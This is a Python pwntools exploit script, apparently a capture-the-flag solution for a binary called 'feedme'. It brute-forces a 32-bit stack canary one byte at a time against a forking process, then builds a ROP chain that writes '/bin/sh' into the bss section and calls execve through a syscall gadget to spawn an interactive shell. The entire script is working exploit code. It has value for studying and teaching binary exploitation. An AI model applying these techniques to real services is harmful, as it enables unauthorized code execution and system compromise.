from pwn import *
context.binary = './feedme'
context.kernel = context.arch
io = process('./feedme')

CANARY_OFFSET = 32

def crack_canary() -> bytes:
	canary = b''
	base_payload = cyclic(CANARY_OFFSET)	# fill until stack canary
	p = log.progress("Brute Forcing Canary...")
	while len(canary) != 4:
		for i in range(255):
			payload = base_payload
			payload += canary
			payload += p8(i)

			context.log_level = "Info"
			p.status(f"0x{(canary + p8(i)).hex()}")
			context.log_level = "Warning"

			io.send(p8(len(payload)))		# first byte represents size of input to fetch
			io.send(payload)

			recv = io.recvuntil(b"Child exit.")
			# print(recv)
			if b"stack smashing detected" not in recv:
				canary += p8(i)
				break

	context.log_level = "Info"
	p.success(f'Canary is 0x{canary.hex()}')
	return canary

canary = crack_canary()
log.info("Creating ROP Payload...")
rop = ROP('./feedme')
WRITE_GADGET_ADDR = 0x0807be31	# mov dword ptr [eax], edx ; ret
FREE_SPACE_ADDR = 0x80eb928		# bss
SYSCALL_GADGET_ADDR = 0x0806328d
EXECVE_SYSCALL_NR = 11

# Write /bin/sh to free space
rop(eax=FREE_SPACE_ADDR, edx=b'/bin')	# can only move 4 bytes at a time with this gadget
rop.raw(WRITE_GADGET_ADDR)
rop(eax=FREE_SPACE_ADDR + 4, edx=b'/sh\x00')
rop.raw(WRITE_GADGET_ADDR)

# create shell process
rop(eax=EXECVE_SYSCALL_NR, ebx=FREE_SPACE_ADDR, ecx=0, edx=0)		# free_space_addr now has /bin/sh
rop.raw(0x08049761)

payload = flat({
	CANARY_OFFSET : canary,
	cyclic_find(0x6161616d) : rop.chain(),
})
print(rop.dump())
# gdb.attach(io, '''
# 	b *0x080490ae
# 	b *0x08049036
# 	c
# ''')
log.info("Sending ROP...")
io.send(p8(len(payload)))
io.send(payload)
io.recvuntil(b'...')
io.recvuntil(b'\n')
log.success("Got Shell!")
io.interactive()
# while True:
# 	sleep(500)
